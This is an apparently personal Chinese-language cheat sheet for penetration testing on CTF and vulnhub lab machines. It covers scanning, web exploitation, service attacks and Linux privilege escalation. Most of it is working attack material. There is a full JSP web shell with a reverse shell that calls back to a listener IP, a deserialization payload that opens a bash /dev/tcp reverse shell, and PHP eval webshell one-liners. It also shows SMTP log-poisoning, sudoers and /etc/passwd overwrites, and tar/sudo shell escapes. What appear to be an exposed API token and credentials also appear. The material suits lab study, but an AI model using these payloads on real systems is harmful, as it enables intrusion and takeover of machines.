# 信息搜集

**渗透测试的本质就是信息收集**



## 端口探测

- 主机发现

  ```bash
  nmap -sn 192.168.0.111 --min-rate=1111
  ```

  ```
  nmap -sP 192.168.0.111 --min-rate=1111
  ```

- 直接扫全端口

  ```bash
  nmap -A -sVC -O -p- 192.168.0.141 -oA namp.txt
  ```

- 推荐用法，先找出端口再指定端口扫描

  ```bash
  nmap -sn -n --min-rate 1000 192.168.10.0/24
  ip=192.168.10.8
  ports=$(nmap -p- -sS -n --min-rate=1000 $ip | grep -oE '(^[0-9][^/tcp]*)' | tr '\n' ',')
  nmap -p$ports -sV -sC -O $ip -oN nmap.txt
  nmap --script=vuln -p$ports -oN vuln.txt $ip
  ```

  ```bash
  IP=192.168.0.102
  nmap  -sV -sC -O  $IP -oA nmap.txt -p `nmap -sS -sU -PN -p- $IP --min-rate=8888 | grep '/tcp\|/udp' | awk -F '/' '{print $1}' | sort -u | tr '\n' ','`
  ```

- namp 配合提取端口，再扫描

  ```bash
  nmap 192.168.0.102 -p- -min-rate 8888 -r -PN -sS -oA kioptrix2/port-scan
  cat port-scan.nmap | grep open | awk -F '/' '{print $1}' | tr '\n' ','
  nmap 192.168.0.102 -p 22,80,111,443,631,1010,3306 -sV -sC -O  --version-all -oA server-info
  ```

-  nmap 使用默认漏洞脚本扫描

  ```bash
  nmap $ip -p$ports --script=vuln -oA server-vuln
  ```

- 常见

  ```bash
  nmap -n -v -sV -sC 10.10.10.56
  ```

  


## web上下文枚举

- `nikto` 简单探测

  ```bash
  nikto -host 192.168.0.102
  ```

- `gobuster`

  ```bash
  gobuster dir -u http://192.168.0.102 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak 
  ```

  忽略证书  [子域名挖掘的新操作(gobuster) - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/33999581)

  ```bash
  └─# gobuster dir -u https://192.168.0.102:12380/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,txt,html,js,php.bak,txt.bak,html.bak,json,git,git.bak -k
  ```

  `--add-slash` 为结尾加上后缀 / ，如 http://10.10.10.56/cgi-bin/

  ```bash
  └─# gobuster dir -u http://10.10.10.56 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt --add-slash
  ```

   没扫到什么目录的话，可以尝试换个大字典，也可以尝试二级目录的爆破

  ```bash
  gobuster dir -u http://192.168.0.102/masteradmin/
  ```

- `dirb` ，默认递归枚举，扫到一个目录后会去扫它的下一级目录

  ```bash
  dirb http://wordy/
  ```

- dirsearch

  [dirsearch用法大全_kit_1的博客-CSDN博客](https://blog.csdn.net/qq_43936524/article/details/115271837)
  
  仅扫目录，如 http://10.10.10.6/cgi-bin/，后缀为 `/`
  
  ```bash
  └─# dirsearch -u http://10.10.10.56 -w /root/shocker/dict.list --remove-extensions  --suffixes /
  ```

- feroxbuster

  ```bash
  └─# apt install feroxbuster
  ```

  追加 / 到字典里每个词，如 http://10.10.10.6/cgi-bin/，后缀为 `/`

  ```bash
  └─# feroxbuster -u http://10.10.10.56/ -w /root/shocker/dict.list -f
  ```

  [feroxbuster强制浏览工具|预测资源位置|文件目录资源枚举 - 🔰雨苁ℒ🔰 (ddosi.org)](https://www.ddosi.org/feroxbuster/)

  指定后缀名

  ```bash
  └─# feroxbuster -u http://10.10.10.56/cgi-bin/ -w /root/shocker/dict.list -x sh
  ```



## 子域名爆破

常在 /etc/hosts 里绑定了域名解析后，常见手段可以是子域名爆破

-   `wfuzz` ，`--hw` 是排除返回包里普遍且不需要的长度（排除大多数不存在域名的返回不正常影响）

  ```bash
  └─# wfuzz -H 'HOST: FUZZ.cereal.ctf:44441' -u 'http://192.168.0.104:44441' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt  --hw 2,45 
  000000853:   200        49 L     140 W      1538 Ch     "secure - secure"   
  ```

  

## 有心人



-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 在 web 打点、服务探测中，要留心一些**用户名密码**信息，比如web博客里流露出的用户名、哪里存在的密码本......

  要留心把它们做**用户密码字典**，之后好枚举爆破 SSH、FTP、SMB或者网站后台等等的账号密码

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 在 web 打点中，看到一套系统时，要注意它指纹的 cms 的版本。可以用 `whatweb`  `whatweb http://derpnstink.local/weblog/` 或者 `nikto` `nikto -host 192.168.1.22 `工具检查指纹，或者一些国产工具啥的具体网上搜索吧。 配合 kali 的 `searchsploit` 命令 或者 `Google Hacking` 搜索有无已知漏洞。

  `searchsploit -m 漏洞数字编号` 这条命令是把漏洞利用的脚本复制到当前目录



# web打点

## 思路

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 当访问网站出现了**有限制的信息**，如下：

  <img src=".\图片\20210628151131831.png" alt="20210628151131831" style="zoom:80%;" />

  可以**更换一下请求头中的一些字段**，如  `x-forwarded-for`、`referer`、`user-agent` 等等尝试。

  一些工具：下载地址 https://www.cnblogs.com/niuben/p/13386863.html

  链接：https://pan.baidu.com/s/1bvK2O6AGb9XZDiajhluVbA
  提取码：1zfj

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- web渗透时对网站注意**查看源码**，看一些**地址路径**、**注释**、有无泄露的**账号密码**或 **cms 的版本**等等，有工具 `URLfinder` 等。

  补充一个浏览器安全的知识点，在浏览器中，对于不可浏览的 Password 密码框，用F12审查元素将这个 input 标签的 type 从 `password` 改为 `text`  ，内容就可看见了。

  <img src=".\图片\20210628162949517.png" alt="20210628162949517"  />

  <img src=".\图片\2021062816295957.png" alt="2021062816295957"  />

  在这里也可以直接看 value 的值。

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 仔细观察网站功能点中 URL 的特点，如 `?id=`  、 `?filename=`、`/user/1`  等，或者 POST 数据 或者 请求头里字段的特点，可能有sql注入、文件包含、越权等可能性，可以用 **FUZZ 大法** 模糊测试，常见工具有 `ffuf(kali自带)`、`burpsuite` 等， `seclists` 里有关于 fuzz 的字典

  例子：越权

  ```
  修改更改密码链接的参数，修改admin的密码：admin@zybox.company
  ```

  <img src=".\图片\Snipaste_2022-11-26_17-54-37.png" alt="Snipaste_2022-11-26_17-54-37" style="zoom:80%;" />

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 文件上传无法上传脚本或者脚本不解析但上传目录可控时，试试顺从它。另辟蹊径，尝试上传公钥 `authorized_keys` 到 `.ssh` 目录下。

  将 authorized_key 上传到/home/user/.ssh/  ，再私钥ssh登录，上传的路径为：

  ```
  ../../../../../../home/user/.ssh/authorized_keys
  ```

  同理拓展一下，也可以上传计划任务。

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 文件上传碰到 apache 服务器时，注意 `.htaccess`文件。例如：

  靶机里可能有 `.htaccess`，而且页面返回提示是：`extension not allowed, please choose a CENG file`

  把文件后缀名改为 1.php.ceng，由于.htaccess 的解析，即可成功执行 1.php.ceng

-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 在请求交互中，遇见了用户可控的且一眼看上去是**序列化**的字符串请求，留心反序列化漏洞（一般反序列化漏洞需要白盒找源码的，注意扫描备份文件）。举个修改后得到的POC例子：

  ```
  O:8:"pingTest":3:{s:9:"ipAddress";s:63:"127.0.0.1;bash -c 'bash -i >& /dev/tcp/192.168.0.102/1314 0>&1'";s:7:"isValid";b:1;s:6:"output";s:0:"";}
  ```

  -------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

- 包含日志，在UA头里写shell，ctf题里的套路

<img src=".\图片\Snipaste_2022-11-26_18-13-42.png" alt="Snipaste_2022-11-26_18-13-42" style="zoom:67%;" />

------------------------------------------

- 当我们从数据库或者源码啥的得到了一个密码的MD5值，发现爆破不出来时，尝试**翻看源码**，可能是一个加盐的MD5加密。拓展思路，得到一个密文时，加入不知道其加密方式，那么就留心网站白盒的可能性，从源码中找到自定义的加密算法，然后自己写脚本逆向解密

----

- 查看网站源码时，可能一些接口没有做成图形化，或者这个图形化的链接被隐藏了，要留心。举个例子比如文件上传：

  看看管理主页的源码信息吧，发现了这个玩意儿  `index.php?page=site_settings`

  ```html
  <div class="sidebar-list">
  			................
  			........
  				<!-- <a href="index.php?page=site_settings" class="nav-item nav-site_settings"><span class='icon-field'><i class="fa fa-cogs text-danger"></i></span> System Settings</a> -->
  					</div>
  ```

  <img src=".\图片\Snipaste_2022-12-04_16-10-25.png" alt="Snipaste_2022-12-04_16-10-25" style="zoom:80%;" />

--------

- fuzz 大法试试文件包含，工具 `ffuf`

  ```bash
  └─# ffuf -u "http://192.168.2.14/test.php?FUZZ=/etc/passwd" -c -w /usr/share/seclists/Discovery/Web-Content/common.txt -fs 80 -o fuzz.output
  ```

  linux常见文件字典

  ```
  /usr/share/seclists/Fuzzing/LFI/LFI-etc-files-of-all-linux-packages.txt
  ```

  - 包含 apache 的日志文件，在 ua 头 里写 shell

  - 包含网站配置文件，查看相关密码

  - 包含私钥 

    ```bash
    curl http://192.168.2.14/test.php?file=/home/qiu/.ssh/authorized_keys   查看是否开启了私钥登录
    curl http://192.168.2.14/test.php?file=/home/qiu/.ssh/id_rsa > id_rsa
    chmod 0400 id_rsa 
    ssh qiu@192.168.2.14 -i id_rsa
    ```

------

- Tomcat后台拿shell

  上传后门 war 包，访问触发 

  shell.jsp:

  ```jsp
  <%
      /*
       * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
       * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
       * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
       * the command specified in the HTML form). This is to avoid to keep it simple.
       */
  %>
  
  <%@page import="java.lang.*"%>
  <%@page import="java.io.*"%>
  <%@page import="java.net.*"%>
  <%@page import="java.util.*"%>
  
  <html>
  <head>
      <title>jrshell</title>
  </head>
  <body>
  <form METHOD="POST" NAME="myform" ACTION="">
      <input TYPE="text" NAME="shell">
      <input TYPE="submit" VALUE="Send">
  </form>
  <pre>
  <%
      // Define the OS
      String shellPath = null;
      try
      {
          if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
              shellPath = new String("/bin/sh");
          } else {
              shellPath = new String("cmd.exe");
          }
      } catch( Exception e ){}
      // INNER HTML PART
      if (request.getParameter("shell") != null) {
          out.println("Command: " + request.getParameter("shell") + "\n<BR>");
          Process p;
          if (shellPath.equals("cmd.exe"))
              p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
          else
              p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
          OutputStream os = p.getOutputStream();
          InputStream in = p.getInputStream();
          DataInputStream dis = new DataInputStream(in);
          String disr = dis.readLine();
          while ( disr != null ) {
              out.println(disr);
              disr = dis.readLine();
          }
      }
      // TCP PORT PART
      class StreamConnector extends Thread
      {
          InputStream wz;
          OutputStream yr;
          StreamConnector( InputStream wz, OutputStream yr ) {
              this.wz = wz;
              this.yr = yr;
          }
          public void run()
          {
              BufferedReader r  = null;
              BufferedWriter w = null;
              try
              {
                  r  = new BufferedReader(new InputStreamReader(wz));
                  w = new BufferedWriter(new OutputStreamWriter(yr));
                  char buffer[] = new char[8192];
                  int length;
                  while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                  {
                      w.write( buffer, 0, length );
                      w.flush();
                  }
              } catch( Exception e ){}
              try
              {
                  if( r != null )
                      r.close();
                  if( w != null )
                      w.close();
              } catch( Exception e ){}
          }
      }
   
      try {
          Socket socket = new Socket( "192.168.2.7", 1234 ); // Replace with wanted ip and port
          Process process = Runtime.getRuntime().exec( shellPath );
          new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
          new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
          out.println("port opened on " + socket);
       } catch( Exception e ) {}
  %>
  </pre>
  </body>
  </html>
  ```

  打包命令为：

  ```bash
  jar -cf shell.war shell.jsp
  ```

  触发路径为

  ```http
  http://192.168.2.6:8080/shell/shell.jsp
  ```


---

- 对于简单脚本运行的交互过程中来实现自动化（python来实现）

  例子：

  ```bash
  └─# nc 192.168.2.8 1337                                       
    ____                        _____ _                
   / ___| __ _ _ __ ___   ___  |_   _(_)_ __ ___   ___ 
  | |  _ / _` | '_ ` _ \ / _ \   | | | | '_ ` _ \ / _ \
  | |_| | (_| | | | | | |  __/   | | | | | | | | |  __/
   \____|\__,_|_| |_| |_|\___|   |_| |_|_| |_| |_|\___|
                                                       
  
  Let's see how good you are with simple maths
  Answer my questions 1000 times and I'll give you your gift.
  (9, '+', 4)
  > 13
  (6, '+', 8)
  > 
  ```

  运行 1000 次后的 python 实现

  ```python
  from pwn import *
  conn = remote('192.168.2.8',1337)
  resp = conn.recvuntil(b'gift.\n')  # 接收到 gift. 为止
  print(resp.decode(),end='')        # 不知道接收的是哪里，就打印看看
  for i in range(1000):
      # recv
      resp = conn.recvuntil(b'> ')  # 接收到 > 为止
      print(resp.decode(),end='')   
      
      # answer
      data = resp.decode().split('\n')[0]  # 对于接收的字符串做分割
      exec(f"data = {data}")
      exec(f"data = {data[0]} {data[1]} {data[2]}") # 实现 数学操作 的逻辑
      data = str(data) + '\n'
      
      #send
      print(data,end='')
      conn.send(data.encode())
  
  conn.interactive()           # 继续交互
  conn.close()
  ```

----------

- 有个小细节，当我们测试网站时，对于 302 跳转，**我们得用 bp 拦截了 302 才能看到结果**，因为直接使用浏览器会直接 302 跳转到其它地方

-------------

- 对于一般 **waf 的绕过**，我们需要 **fuzz 大法**测试，把一堆 特殊字符 组合，然后放进一个字典 ，再使用 bp 的爆破模块，查看回显页面的不同，就可以知道哪个特殊字符被拦截了，然后慢慢尝试替换想办法绕过 

--------------------

- `cewl` 工具，爬取网站关键词，生成社工字典

  ```bash
  cewl http://pinkydb/ -w /tmp/cs.txt
  ```

------------

- 尝试文件包含的伪协议

  ```http
  http://192.168.0.102/index.php?page=php://filter/read=convert.base64-encode/resource=config
  ```

- 关于文件包含指定了后缀，要么可能截断，要么只能顺从它，读取指定后缀的文件，重要的文件比如网站配置文件如config啥的

-------------------------------------------

- 发现命令注入时，类似 `127.0.0.1;whoami` ，无法 反弹 shell 时（这可以用 nc 反弹），那就**顺从它**，可尝试远程下载后门执行，可尝试读取服务器敏感文件如 `/etc/passwd` 

---------------------------------------------

- 可以使用 `curl -X OPTIONS http://192.168.0.105/test -vv` 查看网站请求与响应信息，可以查看到是否允许其它格式的访问，比如 POST、PUT 等。PUT 格式请求访问，靶场这里可以上传文件

- burp 更换请求方式，POST、PUT 等

  尝试上传一句话木马

  <img src=".\图片\Snipaste_2023-06-22_17-00-05.png" alt="Snipaste_2023-06-22_17-00-05" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-06-22_17-00-44.png" alt="Snipaste_2023-06-22_17-00-44" style="zoom:80%;" />

------------

- 无论是靶场还是实战，遇到的网站都会是有一点是有剧情的，像一个游戏也是有剧情的。我们可以暂时抛开脑子里的 owasp-top10 漏洞。原汁原味从目标网站出发，**感受这个网站是干嘛的**，**会不会不经意间流露出一些公司内部信息**，根据这些信息（剧情）一步一步的走，看看会不会有惊喜

----------------

- 注意web常见目录 `robots.txt`

------

- url 里类似 `?page=tools.html` 可能就存在文件包含啥的，发现网站存在文件包含时，要留意网站的功能点是否存在插入 shell 的地方，再来包含

---------------



## Wordpress专题

### wpscan

[WPScan](https://wpscan.com/) 官网

配置

```bash
└─# cat /root/.wpscan/scan.yml 
cli_options:
  api_token: L6qtLJk0swdg0XRMKX6eU5BJE6I0fbV52H8wFLcZKXY
```

基本命令

```
wpscan --url http://wordy/           
wpscan --url http://wordy/ -eu      枚举用户名
wpscan --url http://derpnstink.local/weblog/ --enumerate u   枚举用户名
wpscan --url http://wordy/ -U usernames.txt -P passwords.txt     爆破后台
wpscan --url http://derpnstink.local/weblog/ --enumerate vp,vt,tt,u  综合扫描，利用已知漏洞
```

  扫 https 时要注意忽略证书检测 `--disable-tls-checks`，wpscan 使用 [wpscan 工具使用教程_wpscan使用教程_liver100day的博客-CSDN博客](https://blog.csdn.net/liver100day/article/details/117585795)

### 拿shell

#### 插件plugin 

`searchsploit` 查找然后利用。也可以用 msf，具体参考这篇文章 [渗透项目（七）：DERPNSTINK: 1_Ays.Ie的博客-CSDN博客](https://blog.csdn.net/weixin_43938645/article/details/127820275)

#### 文件上传

找上传点，`GIF89a<?php eval($_POST[x]); ?>`，可能上传后路径在 `/blogblog/wp-content/uploads/` 下

#### 编辑主题模版

`wpscan` 后台 编辑 `Theme` 内容写 shell，主题模版的网站路径在 `http://192.168.56.103/wordpress/wp-content/themes/twentynineteen/404.php`



# 端口打点

黑客街，不会的就查查

```http
https://book.hacktricks.xyz/welcome/readme
```

## 25/110

```bash
└─# telnet $ip 110
```

例子：

```
user mindy
pass mindy
list

    1 1109
    2 836

RETR 1
```

```bash
smtp-user-enum -M VRFY -U [字典] -t 192.168.247.151
-M    ---用于猜测用户名 EXPN、VRFY 或 RCPT 的方法（默认值：VRFY）
-U    ---通过 smtp 服务检查的用户名文件
-t    ---host 服务器主机运行 smtp 服务
字典是这个，也可以选取类似：
/usr/share/metasploit-framework/data/wordlists/unix_users.txt
```

```bash
nc [ip] [port]  或者：telnet [ip] [port]  
1）HELO [user]    ---向服务器标识用户身份
2）MAIL FROM:"[user] <?php echo shell_exec($_GET['cmd']);?>"   ---MAIL FROM:发件人
3）RCPT TO:[reciver]   ---RCPT TO:收件人
4）DATA    ---开始编辑邮件内容
5）.       ---输入点代表编辑结束
```

[【渗透技巧】pop3协议渗透_pop3渗透_包大人在此的博客-CSDN博客](https://blog.csdn.net/b10d9/article/details/112155909)

[110-pop3 (flowus.cn)](https://flowus.cn/5fd1d77b-b5ed-4753-a765-90bdbf6bffb7)

[110,995 - Pentesting POP - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-pop)

## 139/445

smb服务

- nmap

```bash
nmap 10.10.10.4 -p 139,445 --script=smb-enum-shares
```

- 枚举 linux(smb) 用户，`enum4linux`

```bash
enum4linux 192.168.0.102
+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\sagar (Local User)
S-1-22-1-1001 Unix User\blackjax (Local User)
S-1-22-1-1002 Unix User\smb (Local User)
```

- `smbmap` 列出用户共享目录，不指定用户名时为匿名登录，是 anonymous 账号

```bash
smbmap -H 192.168.0.102 -u smb
smbclient -NL  192.168.2.6 
smbmap -H 10.10.10.4
```

- `smbclient` 访问目录， ls 、get（下载文件命令）、help（帮助命令）、exit（退出）

```bash
smbclient -N -L //10.10.10.4
```

```bash
smbclient //192.168.0.102/smb -U smb
smb: \>get main.txt
```

## 21

ftp 服务

```bash
ftp 192.168.10.4 
anonymous    //匿名登录，知道用户名时可用其它用户名
binary
ls
get XXX
exit
```

也可以使用 wget 命令下载整个目录

```bash
wget -r -np -nH ftp://192.168.0.102/share/openemr/
```

proftpd 的漏洞利用 `searchsploit ProFTPd 1.3.5`，**任意文件复制 + 复制到 ftp 目录 /home/ftp 下 =  任意文件读取**

```bash
telnet 192.168.2.13 21
site cpfr /etc/shadow
site cpto /home/ftp/shadow
```

详情如下：

```http
.\vulnhub\Digitalworld.local (JOY).md
```

## 25

例子：

[25-smtp (flowus.cn)](https://flowus.cn/3902eac4-3ef0-49aa-9271-ec7312910dd1)

[25,465,587 - Pentesting SMTP/s - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)

从25端口入手，通过smtp可以查看到用户

连接上25端口smtp服务，使用VRFY命令发现该命令未被禁用，返回 250 说明有该用户，可以借此来枚举用户

```bash
└─# nc -nv 192.168.0.102 25                                                                                                                               1 ⨯
(UNKNOWN) [192.168.0.102] 25 (smtp) open
220 vulnix ESMTP Postfix (Ubuntu)
VRFY vulnix
252 2.0.0 vulnix
```

当然也可以直接借用工具，使用工具`smtp-user-enum`枚举用户（此处用VRFY方式）

```bash
└─# smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.0.102                                            127 ⨯
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Jun 24 01:12:15 2023 #########
192.168.0.102: backup exists
192.168.0.102: bin exists
192.168.0.102: daemon exists
192.168.0.102: games exists
192.168.0.102: gnats exists
192.168.0.102: irc exists
192.168.0.102: landscape exists
192.168.0.102: libuuid exists
192.168.0.102: list exists
192.168.0.102: lp exists
192.168.0.102: mail exists
192.168.0.102: man exists
192.168.0.102: messagebus exists
192.168.0.102: news exists
192.168.0.102: nobody exists
192.168.0.102: postfix exists
192.168.0.102: postmaster exists
192.168.0.102: proxy exists
192.168.0.102: root exists
192.168.0.102: ROOT exists
192.168.0.102: sshd exists
192.168.0.102: sync exists
192.168.0.102: sys exists
192.168.0.102: syslog exists
192.168.0.102: uucp exists
192.168.0.102: user exists
192.168.0.102: whoopsie exists
192.168.0.102: www-data exists
######## Scan completed at Sat Jun 24 01:12:15 2023 #########
28 results.
```

这里与kali本地的 /etc/passwd 比较，只需要提取 root 与 user 这两个重要的用户，然后把其作为字典 ssh 爆破



```bash
telnet 10.10.10.17 110
> USER orestis 
> PASS kHGuERB29DNiNE
> LIST
> RETR 1
> RETR 2
```



## 2049

nfs 服务，详情见

```http
.\vulnhub\vulnix.md
```

## 不常见未知端口

可用 nc 来简单探测

```bash
nc 192.168.2.8 1337   
```

可用 nc 数据流重定向至本地文件

```bash
nc 192.168.0.102 666 > file_port_666
```



# 提权

## 二次信息搜集

得到一定的权限后，想要提权，要做好二次信息搜集

- 查看网站源码信息，常见 web 路径 `/var/www/html`，注意配置文件如  `config.php` 之类的，搜集暴露出的用户名密码，可能有数据库的（那么就连上数据库查看更多的信息）、或者其它的网站后台的账号密码信息。都保存下来，这些信息也可能同时是linux本地的账号密码、ftp的账号密码等等

- 查看 /etc/passwd，和 /home 目录下的信息（包括用户家里的命令历史记录等），得到重要的本地用户名

- 查看计划任务 `cat /etc/crontab`、sudo 权限 `sudo -l`、suid 文件 `find / ‐perm ‐u=s ‐type f 2>/dev/null`、当前进程 `ps -ef`

- 拿下一台服务器后，可以查看 `/home` 用户目录下的 `.ssh` 目录，私钥可能是这台主机远程连接其它主机的私钥，公钥可能是其它主机连接过这台主机的公钥

- 两个提权枚举的脚本

  ```http
  https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
  https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
  ```

- 提权网站，靠山吃山的原则，能利用目标机里的东西就用，实在不行再上传其它东西，渗透时让 目标机 变动越小越好，参考网站：

  ```http
  https://gtfobins.github.io/     
  ```

- 刚开始得到一定权限后，升级交互式好点的 shell

  ```bash
  export TERM=xterm
  python -c 'import pty; pty.spawn("/bin/bash")'
  ```


- **完全提升 shell 的操作手感**

  ```bash
  └─# nc -lvvp 1234  
  www-data@pwnlab:/$ python -c 'import pty; pty.spawn("/bin/bash")'
  python -c 'import pty; pty.spawn("/bin/bash")'
  www-data@pwnlab:/$ export TERM=xterm
  export TERM=xterm
  ```

  再点击键盘 `Crtl Z` 挂到后台

  再挂到前台

  ```bash
  └─# stty raw -echo; fg
  ```

  再点击键盘 `Enter` 

  于是操作手感就上来了



## sudo提权

```bash
sudo -l
```

### php

<img src=".\图片\20210628164717573.png" alt="20210628164717573" style="zoom:80%;" />

参照大博客https://blog.csdn.net/qq_45924653/article/details/108466845

```bash
CMD="/bin/sh"
sudo php -r "system('$CMD');"
```

### nmap

```bash
echo "os.execute('/bin/bash')" > getshell
sudo nmap --script=getshell
```

### /etc/sudoers

- <img src=".\图片\Snipaste_2023-06-18_12-17-12.png" alt="Snipaste_2023-06-18_12-17-12" style="zoom:67%;" />

- [linux详解sudoers - kosamino - 博客园 (cnblogs.com)](https://www.cnblogs.com/jing99/p/9323080.html)

- 对于 `/etc/sudoers`  sudo组的玩法，可以加入一些用户使其拥有所有的 sudo 权限，前提是当前用户可以根据一些其它的命令或程序有权限来修改  sudoers 程序，例子：

  /tmp 目录下创建一个名 update 文件，她会定期以 root 身份运行，修改 `/etc/sudoers` 文件提权

  ```bash
  echo "echo 'www-data ALL=NOPASSWD: ALL' >> /etc/sudoers" > update
  echo "echo end.....ok > /tmp/ok" >> update
  chmod +x update
  ```

------------------------------



### 不存在的目录与文件

新建一个就行了，例子：

`mrderp` 用户 查看 `sudo -l`

```bash
mrderp@DeRPnStiNK:~$ sudo -l
sudo -l
[sudo] password for mrderp: derpderpderpderpderpderpderp

Matching Defaults entries for mrderp on DeRPnStiNK:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User mrderp may run the following commands on DeRPnStiNK:
    (ALL) /home/mrderp/binaries/derpy*
```

并没找到 `binaries` 目录

```bash
mrderp@DeRPnStiNK:~$ ls
ls
Desktop  Documents  Downloads
```

那么就直接新建一个这个目录，然后新建一个文件 `derpy` 类似的名称即可，最后给其执行权限，`sudo` 执行即可提权

这里的 `derpy.sh` 里面的内容可以是反弹 shell 的内容，也可以是 `bash -i` 或者 `/bin/bash` 都可以

```bash
mrderp@DeRPnStiNK:~/binaries$ echo '#!/bin/bash' > derpy.sh
mrderp@DeRPnStiNK:~/binaries$ echo '/bin/bash' >> derpy.sh
mrderp@DeRPnStiNK:~/binaries$ chmod +x derpy.sh 
mrderp@DeRPnStiNK:~/binaries$ sudo ./derpy.sh 
[sudo] password for mrderp: 
root@DeRPnStiNK:~/binaries# id
uid=0(root) gid=0(root) groups=0(root)
root@DeRPnStiNK:~/binaries# cat derpy.sh 
#!/bin/bash
/bin/bash
```

### vim

```bash
patrick@development:~$ sudo vim 1
```

<img src=".\图片\Snipaste_2023-07-06_15-26-31.png" alt="Snipaste_2023-07-06_15-26-31" style="zoom:67%;" />

### su

`sudo -l` 发现 `RickSanchez` 可以以任何身份执行任何命令，于是 `sudo su` 提权

<img src=".\图片\e8e680330d5debbe001d1dd12c81b5d8.png" alt="e8e680330d5debbe001d1dd12c81b5d8" style="zoom: 80%;" />

### /usr/sbin/tcpdump

详情见

```http
.\vulnhub\Web Developer1.md
```

### tar/zip

例子：tar 和 zip 命令能以 sudo 运行时，都能提权的[tar命令提权 - 隐念笎 - 博客园 (cnblogs.com)](https://www.cnblogs.com/zlgxzswjy/p/15210570.html)

```bash
zico@zico:~/wordpress$ cd /tmp
cd /tmp
zico@zico:/tmp$ echo "/bin/bash" > shell.sh
echo "/bin/bash" > shell.sh
zico@zico:/tmp$ echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > "--checkpoint-action=exec=sh shell.sh"
zico@zico:/tmp$ echo "" > --checkpoint=1
echo "" > --checkpoint=1
zico@zico:/tmp$ sudo tar cf archive.tar *
sudo tar cf archive.tar *
root@zico:/tmp# id
id
uid=0(root) gid=0(root) groups=0(root)
```



## suid配合环境变量劫持

例子：

环境变量提权，已知 `/usr/bin/netscan` 具有 `suid` 权限并发现其调用 `netstat` 命令，直接创建 `netstat` 文件写入 /bin/sh，再把当前目录 tmp 设置到环境变量中，在当前 tmp 目录执行 netscan 时会调用 /tmp下的 netstat 文件从而执行 /bin/sh 。哦哦，前提条件是 `/usr/bin/netscan` 文件具有以 root 权限执行的 suid 权限，这个我们首先通过第一步 `find / -type f -perm -u=s 2>/dev/null` 便找到了。详细见：

```http
E:\渗透笔记\靶机\vulnhub\Os-ByteSec.md
```



## suid提权

s 权限的作用：表示对文件具用可执行权限的用户**将使用文件拥有者的权限或文件拥有者所在组的权限**在对文件进行执行。

[linux 文件 s 权限 - _H0f - 博客园 (cnblogs.com)](https://www.cnblogs.com/someone9/p/8551010.html#:~:text=s权限的作用：表示对文件具用可执行权限的用户将使用文件拥有者的权限或文件拥有者所在组的权限在对文件进行执行。 s权限的设置：4，用户拥有者的执行权限位， 6，用户组的执行权限位，,2， 两者都设置， 0， 两者都不设置。)

查找 suid 权限的文件

```bash
find / ‐perm ‐u=s ‐type f 2>/dev/null
```

### wget

远程 `wget` 下载并替换 `/etc/passwd` 

```bash
openssl passwd -1 -salt zf1yolo 123456
$1$zf1yolo$oULk89mtehUjxLPH9cRSn1
zf1yolo:$1$zf1yolo$oULk89mtehUjxLPH9cRSn1:0:0:root:/root:/bin/bash
```

```bash
wget http://172.16.250.128:8001/passwd -O /etc/passwd
su zf1yolo
123456
```

### cp

openssl本地生成账号密码，然后整理到 pass 文件中，然后 cp 覆盖 /etc/passwd

```bash
cp pass /etc/passwd
```

### php

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
```



## 计划任务

- 一个例子：提权命令不行就上脚本 `linpeas` 等，这里是计划任务，以 root 身份运行了一个计划任务 md5check.py，我们需要修改其为反弹 shell，就反弹得到 root 权限。而我们需要 cengover 身份才能修改 md5check.py，在翻阅网站数据库账号敏感信息，提权到mysql，再到数据表里找到了 cengover 账号的密码。
- 在计划任务提权里，编写修改脚本时

  - 可以使用各种语言的反弹shell
  - 可以修改 /etc/passwd
  - 可以 `cp /bin/bash temp/bash_fake` 再添加 s 位 权限，`chmod +s temp/bash_fake`  ，再  `temp/bash_fake -p` 提权

- ```bash
  ls -alh /etc/*cron*
  ```

  

## UDF提权

```
详情见 vulnhub Raven2 靶机
